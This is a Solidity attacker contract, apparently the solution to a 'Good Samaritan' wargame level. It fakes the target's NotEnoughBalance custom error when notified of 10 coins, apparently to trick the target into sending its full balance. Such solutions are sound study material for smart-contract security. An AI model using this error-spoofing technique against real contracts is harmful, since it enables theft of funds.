// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {INotifyable, GoodSamaritan} from "./GoodSamaritan.sol";

contract BadSamaritan is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function requestDonation(address _goodSamaritan) external {
        GoodSamaritan(_goodSamaritan).requestDonation();
    }
}
